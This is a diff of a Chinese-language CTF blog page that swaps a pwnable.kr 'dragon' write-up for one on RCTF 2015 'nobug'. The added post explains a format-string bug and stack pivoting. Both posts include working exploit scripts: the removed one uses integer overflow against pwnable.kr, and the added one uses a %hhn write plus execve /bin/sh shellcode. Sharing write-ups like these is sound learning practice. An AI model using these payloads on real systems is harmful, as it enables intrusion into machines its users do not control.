@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Pwnable,integer-overflow,x86," />
+  <meta name="keywords" content="Pwnable,fsb,shellcode,x86,练习," />
 
 
 
@@ -84,22 +84,28 @@
 
 
 
-<meta name="description" content="Trick有符号整数溢出
-Conclusion看到hero的hp是4字节大小，然而monster的是1个字节的，就想到了整数溢出绕过hp的检测
-Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./dragon&apos;target  = (&apos;pwnable.kr&apos;">
+<meta name="description" content="Environment
+LocalLibc  : libc6_2.19-0ubuntu6.6_i386
+
+Bug格式化字符串漏洞fsb
+Conclusion.text:08048B76 sub_8048B76     proc near               ; CODE XREF: sub_8048BD4+6&amp;#25;p&amp;#10;.text:08048B76">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.kr-rookiss-dragon">
-<meta property="og:url" content="http://0byjwzsf.me/2016/07/28/pwnable-rookiss-dragon/index.html">
+<meta property="og:title" content="rctf-qual-2015-nobug">
+<meta property="og:url" content="http://0byjwzsf.me/2016/09/07/rctf-qual-2015-nobug/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
-<meta property="og:description" content="Trick有符号整数溢出
-Conclusion看到hero的hp是4字节大小，然而monster的是1个字节的，就想到了整数溢出绕过hp的检测
-Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./dragon&apos;target  = (&apos;pwnable.kr&apos;">
-<meta property="og:updated_time" content="2016-08-19T07:32:17.000Z">
+<meta property="og:description" content="Environment
+LocalLibc  : libc6_2.19-0ubuntu6.6_i386
+
+Bug格式化字符串漏洞fsb
+Conclusion.text:08048B76 sub_8048B76     proc near               ; CODE XREF: sub_8048BD4+6&amp;#25;p&amp;#10;.text:08048B76">
+<meta property="og:updated_time" content="2016-09-07T11:37:38.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.kr-rookiss-dragon">
-<meta name="twitter:description" content="Trick有符号整数溢出
-Conclusion看到hero的hp是4字节大小，然而monster的是1个字节的，就想到了整数溢出绕过hp的检测
-Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./dragon&apos;target  = (&apos;pwnable.kr&apos;">
+<meta name="twitter:title" content="rctf-qual-2015-nobug">
+<meta name="twitter:description" content="Environment
+LocalLibc  : libc6_2.19-0ubuntu6.6_i386
+
+Bug格式化字符串漏洞fsb
+Conclusion.text:08048B76 sub_8048B76     proc near               ; CODE XREF: sub_8048BD4+6&amp;#25;p&amp;#10;.text:08048B76">
 
 
 
@@ -120,9 +126,9 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
 
 
 
-  <link rel="canonical" href="http://0byjwzsf.me/2016/07/28/pwnable-rookiss-dragon/"/>
+  <link rel="canonical" href="http://0byjwzsf.me/2016/09/07/rctf-qual-2015-nobug/"/>
 
-  <title> pwnable.kr-rookiss-dragon | Icemakr's Blog </title>
+  <title> rctf-qual-2015-nobug | Icemakr's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -302,7 +308,7 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
             
             
               
-                pwnable.kr-rookiss-dragon
+                rctf-qual-2015-nobug
               
             
           </h1>
@@ -314,8 +320,8 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-28T00:00:00+08:00" content="2016-07-28">
-              2016-07-28
+            <time itemprop="dateCreated" datetime="2016-09-07T00:00:00+08:00" content="2016-09-07">
+              2016-09-07
             </time>
           </span>
 
@@ -328,8 +334,8 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
+                  <a href="/categories/CTFs/" itemprop="url" rel="index">
+                    <span itemprop="name">CTFs</span>
                   </a>
                 </span>
 
@@ -344,8 +350,8 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/07/28/pwnable-rookiss-dragon/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/28/pwnable-rookiss-dragon/" itemprop="commentsCount"></span>
+                <a href="/2016/09/07/rctf-qual-2015-nobug/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/09/07/rctf-qual-2015-nobug/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -368,9 +374,24 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
       
 
       
-        <h2 id="Trick">Trick</h2><p>有符号整数溢出</p>
-<h2 id="Conclusion">Conclusion</h2><p>看到hero的hp是4字节大小，然而monster的是1个字节的，就想到了整数溢出绕过hp的检测</p>
-<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./dragon'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9004</span>)</span><br><span class="line"></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line"><span class="comment">#io.gdb_hint([0x08048d78])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># struct monster &#123;</span></span><br><span class="line"><span class="comment">#     int     *print_func(struct monster *)</span></span><br><span class="line"><span class="comment">#     int     type ; 1 mom, 0 baby</span></span><br><span class="line"><span class="comment">#     char    hp;</span></span><br><span class="line"><span class="comment">#     char    heals;</span></span><br><span class="line"><span class="comment">#     int     deals;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># struct hero &#123;</span></span><br><span class="line"><span class="comment">#     int     type ; 1 priest, 2 knight</span></span><br><span class="line"><span class="comment">#     int     hp;</span></span><br><span class="line"><span class="comment">#     int     mp;</span></span><br><span class="line"><span class="comment">#     int     *print_func(struct hero *)</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">io.writeline(l32(<span class="number">0x08048dbf</span>))</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+        <h1 id="Environment">Environment</h1><blockquote>
+<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_i386</p>
+</blockquote>
+<h1 id="Bug">Bug</h1><p>格式化字符串漏洞fsb</p>
+<h1 id="Conclusion">Conclusion</h1><figure class="highlight"><table><tr><td class="code"><pre><span class="line">.text:08048B76 sub_8048B76     proc near               ; CODE XREF: sub_8048BD4+6&#25;p&#10;.text:08048B76                 push    ebp&#10;.text:08048B77                 mov     ebp, esp&#10;.text:08048B79                 sub     esp, 18h&#10;.text:08048B7C                 mov     dword ptr [esp], offset s ; s&#10;.text:08048B83                 call    _strlen&#10;.text:08048B88                 mov     dword ptr [esp+8], 0&#10;.text:08048B90                 mov     [esp+4], eax&#10;.text:08048B94                 mov     dword ptr [esp], offset s&#10;.text:08048B9B                 call    base64_decode&#10;.text:08048BA0                 mov     [esp+0Ch], eax&#10;.text:08048BA4                 mov     dword ptr [esp+8], offset format ; &#34;%s&#34;&#10;.text:08048BAC                 mov     dword ptr [esp+4], 800h ; maxlen&#10;.text:08048BB4                 mov     dword ptr [esp], offset pt ; s&#10;.text:08048BBB                 call    _snprintf&#10;.text:08048BC0                 push    offset sub_8048BD1&#10;.text:08048BC5                 push    offset sub_8048B32&#10;.text:08048BCA                 push    0&#10;.text:08048BCC                 lea     esp, [esp+4]&#10;.text:08048BD0                 retn</span><br></pre></td></tr></table></figure>
+<p>可以看到在0x8048b76函数处，0x8048bc0处开始的代码有点诡异，正常应该是以如下结尾，然后正常的ret回调用它的指令的下一跳指令处</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mov     esp, ebp&#10;pop     ebp&#10;ret</span><br></pre></td></tr></table></figure>
+<p>程序里的这段代码，则是return到0x8048b32函数，然后开始执行</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048B32</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax@1</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v1; <span class="comment">// eax@1</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v1 = (<span class="keyword">const</span> <span class="keyword">char</span> *)base64_decode((<span class="keyword">int</span>)s, v0, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">snprintf</span>(pt, <span class="number">0x800</span>u, v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里的函数执行完后ret到0x8048bd1处</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">08048BD1        pop     eax&#10;08048BD2        leave&#10;08048BD3        retn</span><br></pre></td></tr></table></figure>
+<p>所以从0x8048b32函数开始，程序连着经历两次<code>leave ret</code></p>
+<p>另外0x8048b32函数处有明显的格式化字符串漏洞，又由于程序是不断循环执行的，因此相当于可以不断的利用这个fsb，这就和<a href="http://0byjwzsf.me/2016/08/09/pwnable-rookiss-fsb/">pwnable.kr-fsb</a>有点像了，那题的最开始的想法是篡改<code>got表</code>，那自然想到我们这里也可以做到修改<code>got</code>表。</p>
+<p>具体的思考过程就是：在栈上存在天然的一对引用关系，即函数调用的上一个栈帧的ebp（记为ebp1）指向下一个栈帧的ebp（记为ebp2），那我们可以利用%n往ebp1上写，来修改ebp2使其指向需要修改的任意内存（理论上，不考虑速度的话），之后再利用%n往ebp2上写，即可实现任意地址写，控制程序流执行0x804a8a0</p>
+<p>当然，这种做法是不实际的，只是理论上可行，因为要考虑print的字符太多的情况下，会很耗时间。实际情况可以利用<code>%hn</code>或者<code>%hhn</code>。</p>
+<p>想到这里本以为题目已经解决了，我只要构造形如<code>%0{}x%4$hhn.%{}x%12$hn</code>的格式化字符串即可完成任意地址写，可是实际情况是，在前一个<code>%hhn</code>写入后修改了ebp2，后一个<code>%hn</code>不会修改已经修改后的ebp2指向的内存，而是修改之前的ebp2指向的内存。这就很尴尬了。</p>
+<p>后来是运气好解决了这问题，大致思路，观察栈上哪里有0x804a8a0，修改<code>ebp</code>为栈上的某个地址（需要先泄露栈的地址)，使得再经历几次<code>leave</code>的<strong><em>stack pivoting</em></strong>后，在ret时，esp恰好指向0x804a8a0。</p>
+<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io  = zio(target = <span class="string">'./nobug_acc0c1b37bec49e0575c94a3916cc771'</span>, timeout = <span class="number">100000</span>)</span><br><span class="line">io.hint([<span class="number">0x08048b6f</span>])</span><br><span class="line">fs1 = <span class="string">'%4$08x'</span></span><br><span class="line">io.wl(b64encode(fs1))</span><br><span class="line">esp = int(io.r(<span class="number">8</span>)[<span class="number">5</span>:], <span class="number">16</span>) + <span class="number">0x4</span></span><br><span class="line"><span class="keyword">print</span> hex(esp)</span><br><span class="line"><span class="keyword">print</span> fs1</span><br><span class="line"><span class="comment"># fs2 = '%0&#123;&#125;x%4$hhn%0&#123;&#125;x%12$08x'.format(esp, 0xa8a0 - esp)</span></span><br><span class="line">shellcode = (</span><br><span class="line">            <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"</span></span><br><span class="line">            <span class="string">"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"</span></span><br><span class="line">            )</span><br><span class="line">fs2 = shellcode + <span class="string">'%0&#123;&#125;x%4$hhn'</span>.format(esp - len(shellcode))</span><br><span class="line"><span class="keyword">print</span> fs2</span><br><span class="line">io.wl(b64encode(fs2))</span><br><span class="line">io.itr()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -395,9 +416,13 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
           
             <a href="/tags/Pwnable/" rel="tag">#Pwnable</a>
           
-            <a href="/tags/integer-overflow/" rel="tag">#integer-overflow</a>
+            <a href="/tags/fsb/" rel="tag">#fsb</a>
+          
+            <a href="/tags/shellcode/" rel="tag">#shellcode</a>
           
             <a href="/tags/x86/" rel="tag">#x86</a>
+          
+            <a href="/tags/练习/" rel="tag">#练习</a>
           
         </div>
       
@@ -406,17 +431,13 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/07/27/pwnable-rookiss-tiny-easy/" rel="next" title="pwnable.kr-rookiss-tiny-easy">
-                <i class="fa fa-chevron-left"></i> pwnable.kr-rookiss-tiny-easy
+              <a href="/2016/09/05/rctf-qual-2015-welpwn/" rel="next" title="rctf-qual-2015-welpwn">
+                <i class="fa fa-chevron-left"></i> rctf-qual-2015-welpwn
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/07/31/alictf-qual-2016-vss/" rel="prev" title="alictf-qual-2016-vss">
-                alictf-qual-2016-vss <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -442,8 +463,8 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2016/07/28/pwnable-rookiss-dragon/"
-           data-title="pwnable.kr-rookiss-dragon" data-url="http://0byjwzsf.me/2016/07/28/pwnable-rookiss-dragon/">
+      <div class="ds-thread" data-thread-key="2016/09/07/rctf-qual-2015-nobug/"
+           data-title="rctf-qual-2015-nobug" data-url="http://0byjwzsf.me/2016/09/07/rctf-qual-2015-nobug/">
       </div>
     
   </div>
@@ -545,7 +566,7 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Trick"><span class="nav-number">1.</span> <span class="nav-text">Trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number">2.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Environment"><span class="nav-number">1.</span> <span class="nav-text">Environment</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Bug"><span class="nav-number">2.</span> <span class="nav-text">Bug</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Conclusion"><span class="nav-number">3.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">4.</span> <span class="nav-text">Exploit</span></a></li></ol></div>
             
           </div>
         </section>
